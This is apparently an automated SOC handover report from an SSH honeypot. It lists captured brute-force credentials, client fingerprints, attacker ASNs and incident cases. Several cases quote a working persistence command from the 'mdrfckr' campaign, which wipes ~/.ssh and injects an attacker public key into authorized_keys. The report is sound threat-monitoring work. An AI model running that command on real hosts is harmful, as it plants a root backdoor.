# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-16 |
| **Generated At** | 2026-04-16T11:09:01Z |
| **Shift Time** | 11:09 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **69** |
| Confirmed Threats | **67** |
| False Positives Filtered | **2** (2.9%) |
| Unique Attacker IPs | **14** |
| Countries of Origin | **5** |
| High Severity Cases | **27** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **42** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **57** |
| Unique Credential Pairs | **32** |
| Unique Usernames | **18** |
| Unique Passwords | **31** |
| Successful Auth Pairs | **17** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 27 |
| `345gs5662d34` | 13 |
| `test` | 2 |
| `download` | 1 |
| `debian` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `ccBB123` | 2 |
| `12345678` | 2 |
| `abcde` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `3245gs5662d34` | 13 |
| `root` | `ccBB123` | 2 |
| `test` | `abcde` | 1 |
| `root` | `root654321@#` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ccBB123` | `212.115.54.84` | 2026-04-16T09:43:29 |
| `root` | `3245gs5662d34` | `212.115.54.84` | 2026-04-16T09:43:33 |
| `root` | `root654321@#` | `110.38.234.220` | 2026-04-16T09:49:41 |
| `root` | `3245gs5662d34` | `110.38.234.220` | 2026-04-16T09:49:45 |
| `root` | `P@$$w0rd@123` | `110.38.234.220` | 2026-04-16T09:55:49 |
| `root` | `123456123` | `110.38.234.220` | 2026-04-16T09:59:59 |
| `root` | `0okm)OKM` | `110.38.234.220` | 2026-04-16T10:01:58 |
| `root` | `qwER12#$` | `110.38.234.220` | 2026-04-16T10:04:01 |
| `root` | `Adm@2025` | `110.38.234.220` | 2026-04-16T10:16:20 |
| `root` | `ccBB123` | `110.38.234.220` | 2026-04-16T10:18:29 |
| `root` | `As123456789` | `110.38.234.220` | 2026-04-16T10:22:29 |
| `root` | `CCbb123` | `110.38.234.220` | 2026-04-16T10:28:37 |
| `root` | `CCbb1234` | `110.38.234.220` | 2026-04-16T10:32:50 |
| `root` | `prueba` | `110.38.234.220` | 2026-04-16T10:37:02 |
| `root` | `hello123` | `218.78.132.164` | 2026-04-16T10:38:15 |
| `root` | `3245gs5662d34` | `218.78.132.164` | 2026-04-16T10:38:18 |
| `root` | `---fuck_you----` | `120.48.36.106` | 2026-04-16T10:39:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **69** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 57 |
| Go SSH scanner | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 56 | 6 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |
| `98f63c4d9c87...` | Generic scanner | 2 | 2 |
| `e0a89321534a...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 56 | 6 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `e0a89321534a...` | libssh | 1 | 1 | Modern SSH client |
| `95420f9d932d...` | Unknown | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `212.115.54.84`, `218.78.132.164`, `110.38.234.220`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **14** |
| Unique ASNs | **12** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS24400` | Shanghai Mobile Communications Co.,Ltd. | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | MEDIUM |
| `AS3132` | Red Cientifica Peruana | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (27)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-bb92954f47b2

| Field | Detail |
|---|---|
| **Source IP** | `212.115.54[.]84` |
| **First Seen** | 2026-04-16 09:43 |
| **Last Seen** | 2026-04-16 09:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 09:43:28` | `cowrie.session.connect` |
| `2026-04-16 09:43:28` | `cowrie.client.version` |
| `2026-04-16 09:43:29` | `cowrie.client.kex` |
| `2026-04-16 09:43:29` | `cowrie.login.success` |
| `2026-04-16 09:43:29` | `cowrie.session.params` |
| `2026-04-16 09:43:29` | `cowrie.command.input` |
| `2026-04-16 09:43:29` | `cowrie.command.failed` |
| `2026-04-16 09:43:29` | `cowrie.log.closed` |
| `2026-04-16 09:43:30` | `cowrie.session.params` |
| `2026-04-16 09:43:30` | `cowrie.command.input` |
| `2026-04-16 09:43:30` | `cowrie.session.file_download` |
| `2026-04-16 09:43:30` | `cowrie.log.closed` |
| `2026-04-16 09:43:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.115.54[.]84` to AbuseIPDB if not already reported
- [ ] Block `212.115.54[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c03f9bd4300

| Field | Detail |
|---|---|
| **Source IP** | `212.115.54[.]84` |
| **First Seen** | 2026-04-16 09:43 |
| **Last Seen** | 2026-04-16 09:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 09:43:32` | `cowrie.session.connect` |
| `2026-04-16 09:43:32` | `cowrie.client.version` |
| `2026-04-16 09:43:32` | `cowrie.client.kex` |
| `2026-04-16 09:43:33` | `cowrie.login.success` |
| `2026-04-16 09:43:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.115.54[.]84` to AbuseIPDB if not already reported
- [ ] Block `212.115.54[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fb645b3541f

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 09:49 |
| **Last Seen** | 2026-04-16 09:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 09:49:40` | `cowrie.session.connect` |
| `2026-04-16 09:49:40` | `cowrie.client.version` |
| `2026-04-16 09:49:40` | `cowrie.client.kex` |
| `2026-04-16 09:49:41` | `cowrie.login.success` |
| `2026-04-16 09:49:41` | `cowrie.session.params` |
| `2026-04-16 09:49:41` | `cowrie.command.input` |
| `2026-04-16 09:49:41` | `cowrie.command.failed` |
| `2026-04-16 09:49:41` | `cowrie.log.closed` |
| `2026-04-16 09:49:42` | `cowrie.session.params` |
| `2026-04-16 09:49:42` | `cowrie.command.input` |
| `2026-04-16 09:49:42` | `cowrie.session.file_download` |
| `2026-04-16 09:49:42` | `cowrie.log.closed` |
| `2026-04-16 09:49:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7d363b4dec6

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 09:49 |
| **Last Seen** | 2026-04-16 09:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 09:49:44` | `cowrie.session.connect` |
| `2026-04-16 09:49:44` | `cowrie.client.version` |
| `2026-04-16 09:49:44` | `cowrie.client.kex` |
| `2026-04-16 09:49:45` | `cowrie.login.success` |
| `2026-04-16 09:49:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21911d47440d

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 09:55 |
| **Last Seen** | 2026-04-16 09:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 09:55:49` | `cowrie.session.connect` |
| `2026-04-16 09:55:49` | `cowrie.client.version` |
| `2026-04-16 09:55:49` | `cowrie.client.kex` |
| `2026-04-16 09:55:49` | `cowrie.login.success` |
| `2026-04-16 09:55:50` | `cowrie.session.params` |
| `2026-04-16 09:55:50` | `cowrie.command.input` |
| `2026-04-16 09:55:50` | `cowrie.command.failed` |
| `2026-04-16 09:55:50` | `cowrie.log.closed` |
| `2026-04-16 09:55:50` | `cowrie.session.params` |
| `2026-04-16 09:55:50` | `cowrie.command.input` |
| `2026-04-16 09:55:51` | `cowrie.session.file_download` |
| `2026-04-16 09:55:51` | `cowrie.log.closed` |
| `2026-04-16 09:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb3da05dd88d

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 09:55 |
| **Last Seen** | 2026-04-16 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 09:55:53` | `cowrie.session.connect` |
| `2026-04-16 09:55:53` | `cowrie.client.version` |
| `2026-04-16 09:55:53` | `cowrie.client.kex` |
| `2026-04-16 09:55:54` | `cowrie.login.success` |
| `2026-04-16 09:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e9e50f9cf5a

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 09:59 |
| **Last Seen** | 2026-04-16 10:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 09:59:58` | `cowrie.session.connect` |
| `2026-04-16 09:59:58` | `cowrie.client.version` |
| `2026-04-16 09:59:58` | `cowrie.client.kex` |
| `2026-04-16 09:59:59` | `cowrie.login.success` |
| `2026-04-16 09:59:59` | `cowrie.session.params` |
| `2026-04-16 09:59:59` | `cowrie.command.input` |
| `2026-04-16 09:59:59` | `cowrie.command.failed` |
| `2026-04-16 09:59:59` | `cowrie.log.closed` |
| `2026-04-16 10:00:00` | `cowrie.session.params` |
| `2026-04-16 10:00:00` | `cowrie.command.input` |
| `2026-04-16 10:00:00` | `cowrie.session.file_download` |
| `2026-04-16 10:00:00` | `cowrie.log.closed` |
| `2026-04-16 10:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c83f4e3e18b

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:00 |
| **Last Seen** | 2026-04-16 10:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:00:02` | `cowrie.session.connect` |
| `2026-04-16 10:00:02` | `cowrie.client.version` |
| `2026-04-16 10:00:02` | `cowrie.client.kex` |
| `2026-04-16 10:00:03` | `cowrie.login.success` |
| `2026-04-16 10:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38d3ab81dfd3

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:01 |
| **Last Seen** | 2026-04-16 10:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:01:57` | `cowrie.session.connect` |
| `2026-04-16 10:01:57` | `cowrie.client.version` |
| `2026-04-16 10:01:57` | `cowrie.client.kex` |
| `2026-04-16 10:01:58` | `cowrie.login.success` |
| `2026-04-16 10:01:58` | `cowrie.session.params` |
| `2026-04-16 10:01:58` | `cowrie.command.input` |
| `2026-04-16 10:01:58` | `cowrie.command.failed` |
| `2026-04-16 10:01:58` | `cowrie.log.closed` |
| `2026-04-16 10:01:59` | `cowrie.session.params` |
| `2026-04-16 10:01:59` | `cowrie.command.input` |
| `2026-04-16 10:01:59` | `cowrie.session.file_download` |
| `2026-04-16 10:01:59` | `cowrie.log.closed` |
| `2026-04-16 10:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cbfe75d0eff

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:02 |
| **Last Seen** | 2026-04-16 10:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:02:01` | `cowrie.session.connect` |
| `2026-04-16 10:02:01` | `cowrie.client.version` |
| `2026-04-16 10:02:01` | `cowrie.client.kex` |
| `2026-04-16 10:02:02` | `cowrie.login.success` |
| `2026-04-16 10:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-842b87b3c6e7

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:04 |
| **Last Seen** | 2026-04-16 10:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:04:00` | `cowrie.session.connect` |
| `2026-04-16 10:04:00` | `cowrie.client.version` |
| `2026-04-16 10:04:00` | `cowrie.client.kex` |
| `2026-04-16 10:04:01` | `cowrie.login.success` |
| `2026-04-16 10:04:01` | `cowrie.session.params` |
| `2026-04-16 10:04:01` | `cowrie.command.input` |
| `2026-04-16 10:04:01` | `cowrie.command.failed` |
| `2026-04-16 10:04:01` | `cowrie.log.closed` |
| `2026-04-16 10:04:02` | `cowrie.session.params` |
| `2026-04-16 10:04:02` | `cowrie.command.input` |
| `2026-04-16 10:04:02` | `cowrie.session.file_download` |
| `2026-04-16 10:04:02` | `cowrie.log.closed` |
| `2026-04-16 10:04:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2b7666db97a

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:04 |
| **Last Seen** | 2026-04-16 10:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:04:04` | `cowrie.session.connect` |
| `2026-04-16 10:04:04` | `cowrie.client.version` |
| `2026-04-16 10:04:05` | `cowrie.client.kex` |
| `2026-04-16 10:04:05` | `cowrie.login.success` |
| `2026-04-16 10:04:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a909b65cb857

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:16 |
| **Last Seen** | 2026-04-16 10:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:16:18` | `cowrie.session.connect` |
| `2026-04-16 10:16:18` | `cowrie.client.version` |
| `2026-04-16 10:16:19` | `cowrie.client.kex` |
| `2026-04-16 10:16:20` | `cowrie.login.success` |
| `2026-04-16 10:16:21` | `cowrie.session.params` |
| `2026-04-16 10:16:21` | `cowrie.command.input` |
| `2026-04-16 10:16:21` | `cowrie.command.failed` |
| `2026-04-16 10:16:21` | `cowrie.log.closed` |
